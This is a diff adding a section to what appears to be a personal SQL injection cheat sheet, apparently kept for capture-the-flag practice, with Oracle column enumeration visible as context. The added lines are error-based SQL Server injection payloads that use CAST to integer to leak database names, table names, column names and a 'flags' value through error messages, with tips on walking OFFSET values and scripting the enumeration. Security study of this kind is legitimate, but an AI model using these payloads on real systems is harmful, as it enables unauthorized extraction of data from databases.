@@ -361,12 +361,46 @@ select column_name, data_type from all_tab_columns where table_name = 'MENU';
 ```
 
 
+Error Base SQL Injection (SQL SERVER)
+
+```sql
+cast((SELECT name FROM sys.databases
+WHERE database_id = 1;) as int)
+```
+
+```sql
+cast((SELECT TOP 1 flag FROM App.dbo.flags;) as int);
+```
+
+```sql
+CAST((SELECT name 
+FROM app.sys.tables 
+ORDER BY name
+OFFSET 2 ROWS FETCH NEXT 1 ROWS ONLY) AS INT);
+```
+
+Tips:
+
+    Keep incrementing the OFFSET to walk through the table names.
+
+    Use a script if possible to automate it.
+
+    Make note of each table name from the error message.
+
+```sql
+CAST((SELECT name FROM app.sys.tables ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) AS INT)
+```
 
 
-
-
-
-
+```sql
+CAST((
+  SELECT name 
+  FROM app.sys.columns 
+  WHERE object_id = OBJECT_ID('app.dbo.flags')
+  ORDER BY name
+  OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY
+) AS INT)
+```
 
 
 
